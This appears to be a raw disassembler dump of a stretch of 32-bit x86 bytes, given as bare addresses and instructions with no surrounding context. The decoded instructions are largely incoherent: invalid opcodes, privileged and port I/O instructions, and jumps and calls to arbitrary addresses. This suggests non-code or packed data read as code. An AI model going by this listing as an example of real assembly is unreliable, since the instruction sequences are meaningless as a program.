  41bccc:	jne    0x41bd09
  41bcce:	ja     0x41bd15
  41bcd0:	cli    
  41bcd1:	shl    BYTE PTR [esi+0x4b3372fe],0xd2
  41bcd8:	adc    esp,DWORD PTR [esi+esi*4+0x2]
  41bcdc:	std    
  41bcdd:	test   bh,0x7f
  41bce0:	jnp    0x41bd43
  41bce2:	xchg   DWORD PTR [ecx+eax*1+0x31],esp
  41bce6:	test   DWORD PTR [ecx+eax*4],0x2fc8f051
  41bced:	bound  esp,QWORD PTR [esp+eax*1-0x75]
  41bcf1:	add    BYTE PTR [eax-0x44],ah
  41bcf4:	dec    esp
  41bcf5:	lea    edx,[eax-0x48]
  41bcf8:	dec    esp
  41bcf9:	call   FWORD PTR [eax-0x18]
  41bcfc:	xchg   bl,cl
  41bcfe:	ins    DWORD PTR es:[edi],dx
  41bcff:	mov    bl,0x70
  41bd01:	clc    
  41bd02:	push   es
  41bd03:	inc    ebp
  41bd04:	stc    
  41bd05:	call   0x3c6a4f
  41bd0a:	or     eax,ecx
  41bd0c:	jae    0x41bd11
  41bd0e:	add    al,BYTE PTR [ebp-0x1f]
  41bd11:	(bad)  
  41bd12:	call   0xcd4274c6
  41bd17:	pop    es
  41bd18:	add    al,ch
  41bd1a:	out    dx,al
  41bd1b:	and    ch,bh
  41bd1d:	inc    DWORD PTR [eax]
	...
  41bd37:	(bad)  
  41bd38:	sub    al,0x5
  41bd3a:	mov    ebx,DWORD PTR [esi+0x1f]
  41bd3d:	inc    ecx
  41bd3e:	cld    
  41bd3f:	dec    esi
  41bd40:	adc    BYTE PTR [edi+0x7d],bh
  41bd43:	and    DWORD PTR [ebx+0xc],ecx
  41bd46:	cmp    DWORD PTR [eax-0x6100054f],0x33
  41bd4d:	icebp  
  41bd4e:	add    bl,ch
  41bd50:	cli    
  41bd51:	cli    
  41bd52:	aaa    
  41bd53:	xchg   esi,eax
  41bd54:	mov    DWORD PTR [ecx],eax
  41bd56:	push   0xffffb434
  41bd5b:	gs ret 
  41bd5d:	add    al,BYTE PTR [ecx]
  41bd5f:	or     eax,0x4685d87d
  41bd64:	xor    eax,0xb508ff16
  41bd69:	cli    
  41bd6a:	jne    0x41bdd9
  41bd6c:	pop    edi
  41bd6d:	std    
  41bd6e:	push   edx
  41bd6f:	add    eax,0xcdffffc0
  41bd74:	fbstp  TBYTE PTR [ecx+0x4f07dc99]
  41bd7a:	call   0x3ee4f5
  41bd7f:	and    bh,BYTE PTR [ebp*8+0x20cef4e8]
  41bd86:	push   DWORD PTR [ebx-0x501024d]
  41bd8c:	fnstenv [eax+0x0]
  41bd8f:	hlt    
  41bd90:	pop    ebp
  41bd91:	jmp    0x1e06d85
  41bd96:	std    
  41bd97:	jmp    0x81acd1
	...
  41bdb4:	hlt    
  41bdb5:	cmc    
  41bdb6:	shr    al,0x83
  41bdb9:	jmp    0x7b5:0xe6e84686
  41bdc0:	jge    0x41bd62
  41bdc2:	push   ebp
  41bdc3:	sub    DWORD PTR [ecx+edx*2-0x31],0x805e6f67
  41bdcb:	clc    
  41bdcc:	call   0xb97a9fa0
  41bdd1:	pop    ecx
  41bdd2:	int3   
  41bdd3:	pop    ebx
  41bdd4:	jg     0x41bdec
  41bdd6:	add    ch,dh
  41bdd8:	xor    eax,0x1400015d
  41bddd:	stos   BYTE PTR es:[edi],al
  41bdde:	mov    edi,0xcb292c80
  41bde3:	cmp    al,0x22
  41bde5:	pushf  
  41bde6:	add    dh,BYTE PTR [esi+ebx*8-0x2a]
  41bdea:	add    eax,0x41e280c
  41bdef:	add    DWORD PTR [ebx+ebx*8],edi
  41bdf2:	or     ah,cl
  41bdf4:	mov    bh,0x5d
  41bdf6:	imul   esi,DWORD PTR [ebp-0x2c],0x3484015c
  41bdfd:	jmp    0xe769bb22
  41be02:	add    eax,0x41fb808
  41be07:	add    ecx,esi
  41be09:	push   edi
  41be0a:	inc    ebp
  41be0b:	inc    ecx
  41be0c:	hlt    
  41be0d:	out    dx,al
  41be0e:	mov    al,0xfc
  41be10:	jmp    0xf481abfc
  41be15:	add    al,0x72
	...
  41be2f:	add    BYTE PTR [eax],al
  41be31:	jne    0x41be74
  41be33:	jmp    0x41be37
  41be35:	idiv   eax
  41be37:	and    al,al
  41be39:	mov    bl,0x7f
  41be3b:	int3   
  41be3c:	or     edi,DWORD PTR [ebp+0x6]
  41be3f:	adc    BYTE PTR [edi-0x7fe0f961],bh
  41be45:	pop    ds
  41be46:	dec    ecx
  41be47:	jecxz  0x41be19
  41be49:	imul   ebx,ebp,0x36
  41be4c:	dec    eax
  41be4d:	xor    eax,0xdfee2605
  41be52:	mul    BYTE PTR [esi-0x13f86fd]
  41be58:	xchg   DWORD PTR [edi+0x5fbe6a5c],esi
  41be5e:	in     eax,dx
  41be5f:	sar    DWORD PTR [edi+edi*8+0x5a1368f9],0x4a
  41be67:	test   BYTE PTR [edi],0x34
  41be6a:	push   cs
  41be6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be6c:	pop    edi
  41be6d:	test   eax,0x48b2a6ed
  41be72:	sub    eax,0x1363d42
  41be77:	out    0xb9,eax
  41be79:	jl     0x41bed0
  41be7b:	into   
  41be7c:	(bad)  
  41be7e:	pop    esp
  41be7f:	mov    dl,0x24
  41be81:	and    ecx,DWORD PTR [edx-0x42]
  41be84:	(bad)  
  41be86:	pop    esp
  41be87:	stos   BYTE PTR es:[edi],al
  41be88:	and    al,0x13
  41be8a:	dec    edx
  41be8b:	scas   al,BYTE PTR es:[edi]
  41be8c:	(bad)  
  41be8e:	pop    esp
  41be8f:	bound  esp,QWORD PTR [ebx+eax*1]
  41be92:	dec    edx
  41be93:	sahf   
  41be94:	fiadd  DWORD PTR [eax]
	...
  41beae:	iret   
  41beaf:	pop    esp
  41beb0:	pop    edx
  41beb1:	and    al,0xf3
  41beb3:	dec    ecx
  41beb4:	mov    ds,edx
  41beb6:	sbb    ebx,DWORD PTR [ebp+0x52]
  41beb9:	and    al,0xe3
  41bebb:	dec    ecx
  41bebc:	jle    0x41be98
  41bebe:	daa    
  41bebf:	pop    ebp
  41bec0:	add    BYTE PTR [edx+0x18],cl
  41bec3:	dec    edx
  41bec4:	std    
  41bec5:	bound  ebp,QWORD PTR [esi-0x63a07cf7]
  41becb:	(bad)  
  41becc:	cld    
  41becd:	pop    ss
  41bece:	sbb    BYTE PTR [esi+0x20],dh
  41bed1:	call   0x5f2971cd
  41bed6:	ror    BYTE PTR [ecx-0x3],1
  41bed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beda:	cmp    cl,BYTE PTR [eax+0x76]
  41bedd:	in     eax,0x3f
  41bedf:	xchg   BYTE PTR [eax],ah
  41bee1:	call   0xe1b806dd
  41bee6:	das    
  41bee7:	into   
  41bee8:	pop    ds
  41bee9:	call   0xf9b806e5
  41beee:	pop    ds
  41beef:	(bad)  
  41bef0:	pop    ds
  41bef1:	call   0x629702ed
  41bef6:	mov    eax,0x5d7dfd85
  41befb:	scas   eax,DWORD PTR es:[edi]
  41befc:	mov    dh,dh
  41befe:	cmp    cl,BYTE PTR [edi+0x18]
  41bf01:	jmp    0xecd6:0x6a0c252b
  41bf08:	out    0xb7,eax
  41bf0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf0b:	inc    edi
  41bf0c:	std    
  41bf0d:	cs sbb eax,0x365e56
	...
  41bf2b:	sar    DWORD PTR [ecx-0x4a0817e1],1
  41bf31:	mov    ch,dl
  41bf33:	jp     0x41bf95
  41bf35:	clc    
  41bf36:	jb     0x41bf64
  41bf38:	add    DWORD PTR [ecx+0x55b463c5],eax
  41bf3e:	push   ss
  41bf3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf40:	aam    0x3
  41bf42:	je     0x41bf6f
  41bf44:	and    eax,0x2c289138
  41bf49:	std    
  41bf4a:	xchg   esi,eax
  41bf4b:	jnp    0x41bf92
  41bf4d:	or     eax,0xfd485b65
  41bf52:	add    ch,cl
  41bf54:	out    dx,eax
  41bf55:	(bad)  
  41bf56:	xchg   dx,ax
  41bf58:	inc    eax
  41bf59:	and    DWORD PTR [ebx*8-0x4ea377ff],edx
  41bf60:	dec    edi
  41bf61:	in     eax,0x1f
  41bf63:	mov    al,ds:0x1d8b0001
  41bf68:	add    edi,DWORD PTR [esi+0xc500144]
  41bf6e:	mov    esi,0x53140051
  41bf73:	jle    0x41bf04
  41bf75:	dec    ebp
  41bf76:	push   esi
  41bf77:	fimul  DWORD PTR [ecx+ebp*4+0x15]
  41bf7b:	pop    ebp
  41bf7c:	add    al,0x56
  41bf7e:	mov    DWORD PTR [ecx+0x20],edx
  41bf81:	sbb    al,0xe8
  41bf83:	(bad)  
  41bf84:	push   edx
  41bf85:	(bad)  
  41bf86:	call   DWORD PTR [eax+ebx*4-0x7fa5e7df]
  41bf8d:	add    DWORD PTR ds:[eax],eax
	...
  41bfa8:	pop    ebp
  41bfa9:	add    al,0x4f
  41bfab:	push   ebx
  41bfac:	xchg   edi,edi
  41bfae:	dec    esi
  41bfaf:	push   ebx
  41bfb0:	pop    edx
  41bfb1:	das    
  41bfb2:	and    DWORD PTR [edx+ecx*2+0x2f],edx
  41bfb6:	and    DWORD PTR [edx+ebx*2+0x2f],ecx
  41bfba:	and    DWORD PTR [edx+ebx*2],esi
  41bfbd:	push   eax
  41bfbe:	rcl    DWORD PTR ds:0x4485010d,0x1
  41bfc5:	sbb    eax,0x804ac337
  41bfca:	adc    BYTE PTR [ecx],al
  41bfcc:	or     eax,0x25458704
  41bfd1:	leave  
  41bfd2:	(bad)  
  41bfd3:	jg     0x41bf9a
  41bfd5:	pop    eax
  41bfd6:	(bad)  
  41bfd7:	mov    ebp,0x3d2b45
  41bfdc:	loope  0x41bfdd
  41bfde:	mov    ebp,0xfd40e200
  41bfe3:	xor    dh,ah
  41bfe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfe6:	test   BYTE PTR [eax+edx*1+0x1c],bh
  41bfea:	push   es
  41bfeb:	push   ecx
  41bfec:	repz test al,0x40
  41bfef:	inc    edi
  41bff0:	jne    0x41c06e
  41bff2:	add    al,0x0
  41bff4:	je     0x41c053
  41bff6:	add    bh,0xf4
  41bff9:	into   
  41bffa:	inc    DWORD PTR [ebx+0x70508b25]
  41c000:	in     al,dx
  41c001:	xor    eax,0x5e34765d
  41c006:	push   eax
  41c007:	je     0x41bfd9
  41c009:	imul   esi,DWORD PTR [edi+0xfc],0x0
	...
  41c023:	add    BYTE PTR [eax],al
  41c025:	sub    dl,bh
  41c027:	ret    
  41c028:	cld    
  41c029:	add    DWORD PTR [esi-0x1d0bc00b],eax
  41c02f:	push   ebx
  41c030:	cmp    DWORD PTR [edi-0xb497ada],eax
  41c036:	pop    ebp
  41c037:	add    DWORD PTR [edx-0x21],ebp
  41c03a:	fmul   st,st(7)
  41c03c:	and    edi,DWORD PTR [ebp+edx*4+0x5d918759]
  41c043:	add    DWORD PTR [eax-0xc],ebp
  41c046:	pop    ebp
  41c047:	add    DWORD PTR [eax-0x3a83b932],esp
  41c04d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c04e:	addr16 push eax
  41c050:	adc    eax,DWORD PTR [eax-0x32003ed0]
  41c056:	add    edi,DWORD PTR [ebp+0x7c]
  41c059:	adc    BYTE PTR [esi],dl
  41c05b:	lods   al,BYTE PTR ds:[esi]
  41c05c:	out    0xa0,eax
  41c05e:	js     0x41c061
  41c060:	add    BYTE PTR [edi-0x48],bh
  41c063:	sti    
  41c064:	mov    bl,bh
  41c066:	add    al,0xac
  41c068:	pop    ds
  41c069:	mov    ds:0xf0705051,al
  41c06e:	loopne 0x41c034
  41c070:	and    edi,DWORD PTR [ebp+ebp*8+0x4d8447c]
  41c077:	retf   
  41c078:	mov    bl,0x13
  41c07a:	int3   
  41c07b:	in     eax,dx
  41c07c:	add    dh,ah
  41c07e:	sub    DWORD PTR [ebx+0xd4576ff],0xe7055bed
  41c088:	add    eax,DWORD PTR [eax]
	...
  41c0a2:	xchg   esp,eax
  41c0a3:	fstp   TBYTE PTR [ebp+0x50]
  41c0a6:	dec    eax
  41c0a7:	and    ebx,ecx
  41c0a9:	mov    ecx,0xf632f0c8
  41c0ae:	add    eax,DWORD PTR ds:0xe917d766
  41c0b4:	dec    esi
  41c0b5:	stc    
  41c0b6:	adc    BYTE PTR [edi+eiz*8],al
  41c0b9:	jl     0x41c0ac
  41c0bb:	inc    ebp
  41c0bc:	xlat   BYTE PTR ds:[ebx]
  41c0bd:	sbb    esp,DWORD PTR [ecx+0x44b50ad5]
  41c0c3:	scas   eax,DWORD PTR es:[edi]
  41c0c4:	cmp    eax,0xa6f063f6
  41c0c9:	add    esi,DWORD PTR [ebp+0x4d]
  41c0cc:	call   0x73f386a7
  41c0d1:	(bad)  
  41c0d2:	xlat   BYTE PTR ds:[ebx]
  41c0d3:	sbb    BYTE PTR [edi-0x40df4782],dh
  41c0d9:	mov    bl,0xd3
  41c0db:	icebp  
  41c0dc:	out    0x3,al
  41c0de:	adc    al,0xaf
  41c0e0:	sub    eax,0xe30917c7
  41c0e5:	add    esi,esp
  41c0e7:	add    al,0x60
  41c0e9:	scas   eax,DWORD PTR es:[edi]
  41c0ea:	pop    ss
  41c0eb:	adc    esi,ebp
  41c0ed:	cmc    
  41c0ee:	xor    eax,0x26
  41c0f1:	add    al,0x75
  41c0f3:	dec    ebp
  41c0f4:	call   0x53c5bed1
  41c0f9:	sub    ah,dl
  41c0fb:	cmp    al,0xe7
  41c0fd:	add    esi,esp
  41c0ff:	shr    BYTE PTR ds:0x8ef018b6,1
  41c105:	stc    
	...
  41c11e:	add    bl,dl
  41c120:	add    al,0x0
  41c122:	mov    dh,0x2c
  41c124:	and    ah,BYTE PTR [esi+ebp*4]
  41c127:	std    
  41c128:	popf   
  41c129:	adc    ebp,DWORD PTR [ecx]
  41c12b:	lock inc edi
  41c12d:	je     0x41c0f4
  41c12f:	fisttp WORD PTR [eax+0x13]
  41c132:	inc    ecx
  41c133:	in     eax,dx
  41c134:	add    eax,0x21ac8f00
  41c139:	adc    DWORD PTR [ecx-0x3c],ebp
  41c13c:	and    DWORD PTR [ecx],edx
  41c13e:	jmp    0x41c112
  41c140:	add    DWORD PTR [ecx-0x2b7c489],0xfffffff5
  41c147:	sbb    edx,DWORD PTR [ecx]
  41c149:	call   0xfd888bd0
  41c14e:	pop    esi
  41c14f:	int3   
  41c150:	and    DWORD PTR [eax],edi
  41c152:	inc    ecx
  41c153:	es out 0xfe,eax
  41c156:	call   0x297268ad
  41c15b:	dec    edi
  41c15c:	jl     0x41c141
  41c15e:	pushf  
  41c15f:	xor    eax,0xac360001
  41c164:	and    DWORD PTR [ecx+eax*2],esi
  41c167:	mov    dl,0xe7
  41c169:	(bad)  
  41c16a:	call   0xe1659299
  41c16f:	iret   
  41c170:	rcr    DWORD PTR ds:0x1bdaf7e8,1
  41c176:	pusha  
  41c177:	dec    ebx
  41c178:	std    
  41c179:	mov    al,BYTE PTR [ebp+0x11581513]
  41c17f:	inc    edx
  41c180:	mov    eax,ds:0xe900
	...
  41c199:	add    BYTE PTR [eax],al
  41c19b:	add    al,cl
  41c19d:	test   al,0x23
  41c19f:	int    0x9e
  41c1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1a2:	imul   edx,DWORD PTR ds:0x258b041e,0x625024dc
  41c1ac:	xor    esp,DWORD PTR [ecx]
  41c1ae:	and    BYTE PTR [esi],dh
  41c1b0:	rcl    BYTE PTR [esi+0x5],0x0
  41c1b4:	or     al,0x1
  41c1b6:	push   ebx
  41c1b7:	mov    ecx,ebx
  41c1b9:	sbb    al,0x28
  41c1bb:	call   0x40189e
  41c1c0:	xchg   esi,eax
  41c1c1:	cmp    eax,0xb98e2421
  41c1c6:	cli    
  41c1c7:	je     0x41c19e
  41c1c9:	pop    ss
  41c1ca:	sti    
  41c1cb:	cmp    ebx,DWORD PTR [esi+0x198b265a]
  41c1d1:	in     eax,dx
  41c1d2:	pop    ss
  41c1d3:	(bad)  
  41c1d4:	leave  
  41c1d5:	nop
  41c1d6:	xor    eax,0xfc3dc918
  41c1db:	xor    BYTE PTR [edx+0x3d],al
  41c1de:	rcl    DWORD PTR [edx],0xd
  41c1e1:	or     DWORD PTR [eax-0x75],edx
  41c1e4:	mov    esp,ebp
  41c1e6:	sbb    edi,edi
  41c1e8:	or     DWORD PTR [ecx-0x2d10aa18],edx
  41c1ee:	cli    
  41c1ef:	mov    ebx,DWORD PTR [ecx-0x14]
  41c1f2:	and    eax,DWORD PTR [edi-0xa]
  41c1f5:	shl    BYTE PTR [ecx-0x29],1
  41c1f8:	push   es
  41c1f9:	push   esp
  41c1fa:	and    DWORD PTR [eax],ebx
  41c1fc:	xor    eax,0x11b32
	...
  41c219:	lea    eax,[ebp+0x78f12444]
  41c21f:	mov    al,BYTE PTR [ecx+edi*1+0x30]
  41c223:	dec    ebp
  41c224:	lea    ebx,[ecx-0x54afcc14]
  41c22a:	loopne 0x41c277
  41c22c:	je     0x41c27a
  41c22e:	or     BYTE PTR [edi+0x70cf36f8],al
  41c234:	xchg   esp,esi
  41c236:	ja     0x41c234
  41c238:	call   DWORD PTR [edx+0x7c]
  41c23b:	mov    ah,ch
  41c23d:	cld    
  41c23e:	ja     0x41c290
  41c240:	push   esi
  41c241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c242:	or     DWORD PTR [edi],ebp
  41c244:	fcomi  st,st(4)
  41c246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c247:	stos   BYTE PTR es:[edi],al
  41c248:	pop    es
  41c249:	and    ebx,ebp
  41c24b:	pop    es
  41c24c:	std    
  41c24d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c24e:	xor    eax,0x8333ac59
  41c253:	dec    ebx
  41c254:	mov    eax,DWORD PTR [ebx-0x5794ecf]
  41c25a:	jb     0x41c251
  41c25c:	ret    
  41c25d:	out    0xed,al
  41c25f:	add    eax,DWORD PTR [edi+0x437da239]
  41c265:	call   0x19297867
  41c26a:	xchg   esi,eax
  41c26b:	dec    ebx
  41c26c:	std    
  41c26d:	outs   dx,DWORD PTR ds:[esi]
  41c26e:	xor    edi,DWORD PTR [eax+0x4b]
  41c271:	shl    BYTE PTR [ebp+0x5c0cfeef],1
  41c277:	aad    0x21
  41c279:	daa    
  41c27a:	pop    ds
  41c27b:	mov    bl,0x67
	...
  41c295:	add    BYTE PTR [edx+0x46ffc24d],dl
  41c29b:	jg     0x41c2e9
  41c29d:	adc    ecx,DWORD PTR [eax+0x6cffc13f]
  41c2a3:	push   0xfffffffd
  41c2a5:	cmp    BYTE PTR [edi-0xa4ffa7f],dh
  41c2ab:	(bad)  
  41c2ac:	clc    
  41c2ad:	cld    
  41c2ae:	ret    0x81c5
  41c2b1:	sbb    esi,ebp
  41c2b3:	sub    eax,0x471ac00f
  41c2b8:	cmp    al,cl
  41c2ba:	leave  
  41c2bb:	mov    dh,0x5f
  41c2bd:	dec    edi
  41c2be:	lds    ebp,FWORD PTR [esi+0x7af4f7e4]
  41c2c4:	adc    ch,bh
  41c2c6:	sbb    eax,0xc273f989
  41c2cb:	fwait
  41c2cc:	js     0x41c301
  41c2ce:	fsub   QWORD PTR [eax-0x3f]
  41c2d1:	push   DWORD PTR [eax+0x68]
  41c2d4:	dec    ecx
  41c2d5:	push   eax
  41c2d6:	mov    ds:0x2fc67404,eax
  41c2db:	aam    0x50
  41c2dd:	add    ch,BYTE PTR [ecx]
  41c2df:	mov    ecx,0x894a4cde
  41c2e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e5:	(bad)  
  41c2e6:	in     eax,0x8f
  41c2e8:	sub    al,0x4c
  41c2ea:	ja     0x41c330
  41c2ec:	xor    ebx,DWORD PTR [ecx]
  41c2ee:	jne    0x41c334
  41c2f0:	jmp    0xdb6e9acc
  41c2f5:	out    dx,al
  41c2f6:	cli    
  41c2f7:	inc    edx
  41c2f8:	jb     0x41c345
	...
  41c312:	add    BYTE PTR [edi+0x42],dh
  41c315:	adc    ebp,ecx
  41c317:	jle    0x41c2e1
  41c319:	fidiv  WORD PTR [ebx-0x4b714720]
  41c31f:	dec    ebp
  41c320:	pop    es
  41c321:	xchg   dh,dl
  41c323:	sti    
  41c324:	inc    ecx
  41c325:	xchg   ebp,eax
  41c326:	xchg   BYTE PTR [eax+edi*4-0x1a244b22],dh
  41c32d:	retf   
  41c32e:	add    dh,ah
  41c330:	cmc    
  41c331:	lods   eax,DWORD PTR gs:[esi]
  41c333:	jl     0x41c37f
  41c335:	mov    esi,0xe709b63a
  41c33a:	mov    al,0x48
  41c33c:	inc    edx
  41c33d:	shl    DWORD PTR [edi],cl
  41c33f:	call   0x7f9ce53a
  41c344:	inc    edx
  41c345:	ds dec esp
  41c347:	jge    0x41c386
  41c349:	ins    BYTE PTR es:[edi],dx
  41c34a:	dec    esp
  41c34b:	or     dh,ch
  41c34d:	xchg   esp,eax
  41c34e:	dec    esp
  41c34f:	add    cl,ch
  41c351:	cli    
  41c352:	pop    ebx
  41c353:	out    dx,eax
  41c354:	inc    ecx
  41c355:	push   ds
  41c356:	dec    esp
  41c357:	jge    0x41c38e
  41c359:	ins    BYTE PTR es:[edi],dx
  41c35a:	push   ebp
  41c35b:	call   0x58f67878
  41c360:	sbb    BYTE PTR [edi-0xf],al
  41c363:	adc    eax,DWORD PTR ds:0x6c74364
  41c369:	add    bh,dh
  41c36b:	add    ebx,ebx
  41c36d:	out    0xe,eax
  41c36f:	dec    ebx
  41c370:	inc    ebx
  41c371:	std    
  41c372:	rcr    BYTE PTR ds:[ecx+0x1c],1
  41c376:	call   0x41c37b
	...
  41c38f:	add    bh,dh
  41c391:	loop   0x41c3ef
  41c393:	arpl   WORD PTR [ebx-0x81e3e25],di
  41c399:	aas    
  41c39a:	je     0x41c3a9
  41c39c:	hlt    
  41c39d:	aas    
  41c39e:	adc    esi,DWORD PTR [ecx]
  41c3a0:	add    eax,0xa0190002
  41c3a5:	imul   edi,ebp,0xffffffae
  41c3a8:	scas   eax,DWORD PTR es:[edi]
  41c3a9:	mov    al,al
  41c3ab:	sbb    al,0xee
  41c3ad:	inc    eax
  41c3ae:	je     0x41c375
  41c3b0:	jmp    0x41c3f2
  41c3b2:	adc    esi,DWORD PTR [ecx]
  41c3b4:	in     eax,0x1
  41c3b6:	add    BYTE PTR [eax+esi*1-0x47],ah
  41c3ba:	add    BYTE PTR [edx-0x1a3e3ac9],bh
  41c3c0:	not    ebp
  41c3c2:	mov    BYTE PTR [ebp+0x1a2c307b],al
  41c3c8:	xchg   ah,dh
  41c3ca:	fdivr  DWORD PTR [esi-0x5e1c49d4]
  41c3d0:	es add eax,0xde1fe900
  41c3d6:	cld    
  41c3d7:	inc    ecx
  41c3d8:	int3   
  41c3d9:	data16 add cl,ch
  41c3dc:	jle    0x41c3e2
  41c3de:	add    cl,ch
  41c3e0:	xchg   eax,ebx
  41c3e2:	push   eax
  41c3e3:	bound  esi,QWORD PTR [esi]
  41c3e5:	aad    0xfc
  41c3e7:	aam    0xc3
  41c3e9:	sbb    BYTE PTR [eax-0x17],al
  41c3ec:	(bad)
  41c3f0:	mov    dl,0xb5
  41c3f2:	adc    al,0xba
	...
  41c40c:	add    BYTE PTR [esi-0x5fd8772c],ah
  41c412:	inc    eax
  41c413:	adc    eax,DWORD PTR [eax]
  41c415:	mov    DWORD PTR [edi*1-0xabc3c00],esi
  41c41c:	cmp    ecx,DWORD PTR [esi]
  41c41e:	and    DWORD PTR ds:[edi-0xfffab3],0x40127d30
  41c429:	sbb    eax,0x94f870ce
  41c42e:	inc    esp
  41c42f:	icebp  
  41c430:	call   0x3c91e0
  41c435:	mov    eax,ds:0x90840ac5
  41c43a:	add    eax,0x44960000
  41c43f:	add    eax,0x3840d089
  41c444:	ret    
  41c445:	adc    BYTE PTR [edi],dh
  41c447:	mov    al,BYTE PTR [ebp-0x5f]
  41c44a:	rol    DWORD PTR [eax+0x8],0x56
  41c44e:	aam    0xb7
  41c450:	xchg   edi,eax
  41c451:	int    0x4
  41c453:	add    al,ch
  41c455:	hlt    
  41c456:	data16 add BYTE PTR [eax],al
  41c459:	loop   0x41c4d2
  41c45b:	push   eax
  41c45c:	inc    eax
  41c45e:	cmp    al,0xfc
  41c460:	adc    eax,0x3d3611
  41c465:	es aam 0x36
  41c468:	repz shl BYTE PTR [eax],0x50
  41c46c:	push   edi
  41c46d:	pop    esi
  41c46e:	ja     0x41c4c0
  41c470:	inc    DWORD PTR [eax]
	...
  41c48a:	sar    BYTE PTR [esp+edi*8],0x15
  41c48e:	pop    ecx
  41c48f:	xor    eax,0xd406003d
  41c494:	ss repz inc ecx
  41c497:	push   ss
  41c498:	sti    
  41c499:	adc    eax,0x3d398d
  41c49e:	lods   eax,DWORD PTR ds:[esi]
  41c49f:	retf   
  41c4a0:	adc    BYTE PTR [eax+eiz*2+0x44],dl
  41c4a4:	std    
  41c4a5:	push   ebp
  41c4a6:	hlt    
  41c4a7:	jge    0x41c502
  41c4a9:	fstp   DWORD PTR [edx+0xf]
  41c4ac:	dec    edx
  41c4ad:	test   BYTE PTR [ecx+eax*8],dh
  41c4b0:	not    BYTE PTR [ebp+0x4b]
  41c4b3:	pop    ecx
  41c4b4:	jmp    0x796f78cb
  41c4b9:	pop    ebx
  41c4ba:	cmp    ebp,DWORD PTR [ecx+0x6ff87440]
  41c4c0:	mov    ebp,0x46f7f5fc
  41c4c5:	adc    eax,DWORD PTR [eax]
  41c4c7:	inc    ecx
  41c4c8:	sar    edi,0xe3
  41c4cb:	lock inc esi
  41c4cd:	jae    0x41c4d0
  41c4cf:	add    eax,0x3580f3a5
  41c4d4:	dec    eax
  41c4d5:	jae    0x41c4df
  41c4d7:	inc    esi
  41c4d8:	push   ecx
  41c4d9:	(bad)  
  41c4da:	sti    
  41c4db:	outs   dx,BYTE PTR ds:[esi]
  41c4dc:	inc    edi
  41c4dd:	jae    0x41c4cb
  41c4df:	in     ax,dx
  41c4e1:	dec    edi
  41c4e2:	add    esi,ebp
  41c4e4:	add    ecx,DWORD PTR [edx+0x5da79739]
  41c4ea:	aas    
  41c4eb:	gs inc esi
  41c4ed:	add    al,0x0
	...
  41c507:	hlt    
  41c508:	and    BYTE PTR [ebx-0x14],bh
  41c50b:	jne    0x41c49e
  41c50d:	mov    WORD PTR [ebx],es
  41c50f:	hlt    
  41c510:	sub    eax,0x5e4e54af
  41c515:	(bad)  
  41c517:	inc    esi
  41c518:	mov    bl,0x4b
  41c51a:	std    
  41c51b:	add    DWORD PTR [esi-0x11],edi
  41c51e:	aas    
  41c51f:	hlt    
  41c520:	stos   BYTE PTR es:[edi],al
  41c521:	aas    
  41c522:	or     al,0x74
  41c524:	push   eax
  41c525:	stc    
  41c526:	dec    DWORD PTR [eax]
  41c528:	inc    edx
  41c529:	test   BYTE PTR [ebx-0x8],bh
  41c52c:	sub    eax,0xf67924cd
  41c531:	iret   
  41c532:	and    BYTE PTR [ebx+0x78],bh
  41c535:	cmc    
  41c536:	mov    BYTE PTR [ebx],bh
  41c538:	add    al,0xf
  41c53a:	xor    BYTE PTR [ecx+0x5],dh
  41c53d:	out    0x7a,eax
  41c53f:	mov    bh,0x40
  41c541:	ins    BYTE PTR es:[edi],dx
  41c542:	inc    esp
  41c543:	ficom  DWORD PTR [edx]
  41c545:	mov    dh,0x48
  41c547:	(bad)  
  41c548:	adc    BYTE PTR [edi],cl
  41c54a:	sub    al,0xed
  41c54c:	add    eax,0x8d447ce7
  41c551:	je     0x41c54a
  41c553:	jbe    0x41c58b
  41c555:	je     0x41c512
  41c557:	in     al,0x44
  41c559:	ror    BYTE PTR [edx-0x718fb0c],1
  41c55f:	imul   ecx,ecx,0xea7bbde
  41c565:	pop    ds
  41c566:	iret   
  41c567:	and    BYTE PTR [ecx+0xf82c],dl
	...
  41c581:	add    BYTE PTR [eax],al
  41c583:	add    BYTE PTR [ebx-0xbfc5054],bh
  41c589:	add    al,0xc2
  41c58b:	cli    
  41c58c:	outs   dx,BYTE PTR ds:[esi]
  41c58d:	leave  
  41c58e:	fidiv  DWORD PTR [ebx+0x3e74b5b]
  41c594:	hlt    
  41c595:	sub    al,0xd8
  41c597:	mov    dh,0xe0
  41c599:	bound  edx,QWORD PTR ds:[ebx+0x77]
  41c59d:	aaa    
  41c59e:	adc    esi,DWORD PTR [edi*2-0x2c4e0d38]
  41c5a5:	and    DWORD PTR [esi+0x2],0xfffffff4
  41c5a9:	mov    ebp,DWORD PTR [eax+ecx*2]
  41c5ac:	ja     0x41c5f3
  41c5ae:	out    dx,al
  41c5af:	sti    
  41c5b0:	dec    ecx
  41c5b1:	sub    eax,0x3eaaed02
  41c5b6:	push   edx
  41c5b7:	mov    ebp,DWORD PTR [edi-0x80]
  41c5ba:	lahf   
  41c5bb:	dec    ebp
  41c5bc:	cdq    
  41c5bd:	ds aas 
  41c5bf:	sub    edi,DWORD PTR [edx+0x4]
  41c5c2:	out    0xdd,eax
  41c5c4:	mov    edx,DWORD PTR [ecx+0x3e826264]
  41c5ca:	add    BYTE PTR [esi],dh
  41c5cc:	inc    edi
  41c5cd:	lea    eax,[ebx-0x23]
  41c5d0:	adc    dl,al
  41c5d2:	sti    
  41c5d3:	jb     0x41c602
  41c5d5:	sub    eax,0x4f7b297
  41c5da:	mov    DWORD PTR [ecx],edx
  41c5dc:	fidivr WORD PTR [ecx-0x47439b05]
  41c5e2:	int    0x69
  41c5e4:	xor    al,BYTE PTR [esi]
  41c5e6:	add    BYTE PTR [edx+0x0],dh
	...
  41c601:	hlt    
